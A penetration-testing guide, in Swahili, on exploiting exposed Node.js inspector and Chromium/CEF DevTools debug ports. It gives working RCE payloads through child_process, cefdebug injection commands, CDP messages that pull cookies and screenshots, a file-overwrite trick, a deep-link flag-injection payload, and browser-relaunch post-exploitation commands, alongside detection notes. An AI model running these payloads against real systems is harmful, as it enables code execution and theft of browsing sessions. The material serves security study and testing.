# Unyanyasaji wa Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Mifano ya kihistoria ya vitendo inajumuisha walkthrough ya Multimaster na shambulio la debugger la Visual Studio Code la CVE-2019-1414; itumie kama muktadha unaohusiana na matoleo, badala ya kudhani kuwa kila target ya sasa ya Electron au Chromium hufichua primitives zilezile.<sup>[[1]](#references)[[3]](#references)</sup>

## Maelezo ya Msingi

[Kutoka kwenye docs](https://nodejs.org/learn/getting-started/debugging): Inapoanzishwa kwa switch ya `--inspect`, process ya Node.js husikiliza client ya debugging. Kwa **default**, itasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila process pia hupewa **UUID** ya **kipekee**.<sup>[[4]](#references)</sup>

Clients za inspector lazima zijue na zibainishe anwani ya host, port, na UUID ili kuunganishwa. URL kamili itaonekana hivi: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina access kamili kwenye mazingira ya utekelezaji ya Node.js**, mshambuliaji hasidi anayeweza kuunganishwa kwenye port hii anaweza kuweza kutekeleza code yoyote kwa niaba ya process ya Node.js (**uwezekano wa privilege escalation**).<sup>[[4]](#references)</sup>

Kuna njia kadhaa za kuanzisha inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanzisha process inayokaguliwa, kitu kama hiki kitaonekana:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**) can expose a debugger with `--remote-debugging-port=9222`. Hii hufichua browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) badala ya Node.js inspector, hivyo Node.js `process`-based payloads hazitumiki moja kwa moja kwa chaguo-msingi.<sup>[[2]](#references)[[5]](#references)</sup>

Unapoanzisha browser yenye debugger, kitu kama hiki kitaonekana:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Kuhesabu na kuendesha CDP endpoint

HTTP discovery endpoints hutofautisha **browser** WebSocket na WebSocket za **target** binafsi (tab, worker, extension, n.k.). Tumia `/json/version` kupata browser endpoint na `/json/list` kupata targets; thamani za `webSocketDebuggerUrl` zinazorudishwa zinaweza kisha kuendeshwa moja kwa moja kwa ujumbe wa CDP unaofanana na JSON-RPC.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Kwa mfano, unganisha kwa `websocat "$BROWSER_WS"` na utume `{"id":1,"method":"Target.getTargets"}` au `{"id":2,"method":"Storage.getCookies"}`. Kwenye page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` hutekelezwa katika renderer hiyo na `Page.captureScreenshot` hurejesha screenshot iliyosimbwa kwa base64. `document.cookie` haiwezi kufichua cookies za `HttpOnly`, ilhali `Storage.getCookies` huomba browser ipate cookie store yake.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browsers, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguka kwenye web-browser zinaweza kutuma maombi ya WebSocket na HTTP chini ya security model ya browser. **Muunganisho wa awali wa HTTP** unahitajika ili **kupata unique debugger session id**. **Same-origin-policy** **huzuia** tovuti kuweza kuanzisha **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kwamba **'Host' headers** za muunganisho zinabainisha **IP address** au **`localhost`** kwa usahihi.<sup>[[4]](#references)</sup>

> [!TIP]
> **Hatua hii ya usalama huzuia kum-exploit inspector** ili ku-run code kwa **kutuma tu HTTP request** (jambo ambalo lingewezekana kwa ku-exploit SSRF vuln).<sup>[[4]](#references)</sup>

### Kuanzisha inspector katika michakato inayoendelea

Unaweza kutuma **signal SIGUSR1** kwa nodejs process inayoendelea ili kuifanya **ianzishe inspector** kwenye default port. Hata hivyo, kumbuka kwamba unahitaji kuwa na privileges za kutosha; kwa hiyo, hii inaweza kukupa **ufikiaji wenye mapendeleo wa taarifa zilizo ndani ya process**, lakini si privilege escalation ya moja kwa moja.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Hii ni muhimu katika containers kwa sababu **kusimamisha process na kuanzisha nyingine** yenye `--inspect` **si chaguo** kwa sababu **container** itauliwa pamoja na process.<sup>[[6]](#references)</sup>

### Unganisha kwenye inspector/debugger

Ili kuunganisha kwenye **Chromium-based browser**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **target host na port** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Baada ya URL ya kufikia debugger kuonekana. kwa mfano ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha kwenye inspector/debugger: Ili kuunganisha kwenye Chromium-based browser,...](<../../images/image (674).png>)

Kwa kutumia **command line** unaweza kuunganisha kwenye debugger/inspector kwa:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Zana [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), huwezesha **kupata inspectors** zinazoendesha locally na **ku-inject code** ndani yake.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa imeunganishwa kwenye browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE katika NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye Node **inspector** ni kutumia kitu kama (inaonekana kwamba hii **haitafanya kazi katika connection na Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimeona watu wakitumia kuitumia vibaya protocol hii.

### Kizuizi cha default-profile katika Chrome 136+

Kuanzia **Chrome 136**, Chrome hupuuza `--remote-debugging-port` na `--remote-debugging-pipe` zinapolenga **default Chrome data directory**. Switch lazima iambatane na `--user-data-dir` isiyo ya kawaida, ambayo encryption key yake tofauti na browser state yake iliyotengwa huzuia technique rahisi inayotegemea flag kufichua authenticated profile ya kawaida ya mtumiaji. Kizuizi hiki maalum cha Chrome hakipaswi kudhaniwa kuwa kinahusu Chrome builds za zamani, Chrome for Testing, applications za Electron/CEF, au derivatives nyingine za Chromium bila verification.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Kwa hiyo, kuona mchakato wa sasa wa Chrome ulioanzishwa kwa `--remote-debugging-port` pekee **hakuthibitishi** kwamba CDP imekuwa active. Thibitisha listener na `/json/version`, na bainisha ni profile ipi hasa inayouwezesha.<sup>[[14]](#references)</sup>

### Parameter Injection kupitia Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kwamba application iliyotegemea CEF **ilisajili custom URI** kwenye system (workspaces://index.html) iliyopokea URI nzima na kisha **kuanzisha application inayotegemea CEF** ikiwa na configuration iliyokuwa inaundwa kwa sehemu kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kwamba parameters za URI zili-decode-ikiwa URL na kutumiwa kuanzisha application ya msingi ya CEF, hivyo kumruhusu mtumiaji **kuingiza** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza vitu kiholela.<sup>[[8]](#references)</sup>

Kwa hiyo, payload kama:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.<sup>[[8]](#references)</sup>

### Andika Juu ya Faili

Badilisha folder ambalo **downloaded files zitawekwa** na upakue faili ili **uandike juu ya** **source code** inayotumiwa mara kwa mara ya application kwa **malicious code** yako.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE na exfiltration

STAR Labs ilionyesha kuwa services za WebDriver/CDP zilizo wazi zinaweza kuwezesha arbitrary file reads na RCE; DNS rebinding inaweza kukamilisha exploit chain katika baadhi ya configurations.<sup>[[9]](#references)</sup>

Kwa cases za kihistoria za browser-automation na usalama wa Chromium, angalia write-up ya Counter WebDriver na issues 773, 1742, na 1944 za Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Enabling CDP inside a live Chromium process

Kwenye Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ilionyesha kuwa command-line restriction si njia pekee ya ku-activate CDP: code ambayo tayari inaweza ku-inject kwenye `msedge.exe` iliyopo inaweza kuita Chromium's non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` na ku-expose authenticated live profile bila ku-restart browser.<sup>[[15]](#references)</sup>

Chain iliyoonyeshwa hu-inject DLL kwa kutumia `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, hu-resolve internal Edge symbols (kwanza kutoka kwenye PDBs na kisha kwa kutumia version-specific byte signatures), hu-subclass browser window, na hutuma message ili final server-start call itekelezwe kwenye **UI thread** ya browser. Socket hufungwa kwenye loopback, ambapo CDP primitives za kawaida zinaweza kuretrieve cookies, capture tabs, ku-inspect network traffic, au ku-evaluate JavaScript kwenye authenticated pages.<sup>[[15]](#references)</sup>

> [!WARNING]
> Hii ni technique ya **post-compromise/process-injection**, si network bypass isiyohitaji authentication. Inategemea sana build kwa sababu C++ symbols zinazohusika hazija-exportiwa na signatures zinaweza kubadilika baada ya browser updates.<sup>[[15]](#references)</sup>

Kwa detection, usitegemee tu command-line telemetry ya `--remote-debugging-*`: pia correlate handles na memory operations zisizo za kawaida dhidi ya browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, na loopback listening sockets zisizotarajiwa zinazomilikiwa na Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Katika environment halisi na **baada ya ku-compromise** user PC inayotumia browser yenye msingi wa Chromium, technique ya kihistoria ilikuwa ku-relaunch browser ikiwa debugging ime-enabled na ku-forward loopback port. Hii inaweza ku-expose browsing state ya victim kwenye products/builds ambazo bado zinakubali profile iliyochaguliwa, lakini Chrome 136+ haitaheshimu hili dhidi ya default data directory yake.<sup>[[7]](#references)[[14]](#references)</sup>

Original relaunch command imehifadhiwa hapa chini kwa targets za zamani/version-specific. Command ya pili ndiyo supported current-Chrome form, lakini huunda isolated profile badala ya kufungua tena victim's normal authenticated state.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Kwa tradecraft maalum ya macOS kuhusu relaunch, extension na CDP za Chromium, angalia [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Zana ya ukaguzi na exploitation ya CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution ya Visual Studio Code kupitia Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Mwongozo wa Debugging wa Node.js - Kuanza](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup ya corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Kutumia Vibaya Kipengele cha Debugging cha Chrome Kuchunguza na Kudhibiti kwa Mbali Vipindi vya Browsing](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution ya AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Unazungumza Nami? - WebDriver RCE kupitia DNS Rebinding na CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Kutoka Bot hadi RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Mabadiliko ya remote debugging switches ili kuboresha usalama - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Kuingiza CDP kwenye Edge Browser Inayoendesha: Uchambuzi wa Kina wa Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
